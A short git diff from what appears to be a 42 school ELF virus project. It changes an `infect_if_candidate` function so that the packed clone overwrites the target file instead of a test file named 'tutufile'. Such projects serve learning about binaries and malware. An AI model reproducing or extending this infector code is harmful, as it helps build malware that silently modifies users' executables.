@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 02:26:10 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 02:36:11 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -53,10 +53,10 @@ inline bool	infect_if_candidate(const char *file)
 	food.clone_safe = clone_accessor(food.original_safe.filesize);
 	if (food.clone_safe.ptr == NULL) return errors(ERR_THROW, "infect_if_candidate");
 
-	if (elf64_packer(food, food.original_safe.filesize))
+	if (!elf64_packer(food, food.original_safe.filesize))
 		return errors(ERR_THROW, "infect_if_candidate");
 
-	write_clone_file(food.clone_safe, "tutufile");
+	write_clone_file(food.clone_safe, file);
 
 	free_accessor(food.original_safe);
 	free_accessor(food.clone_safe);
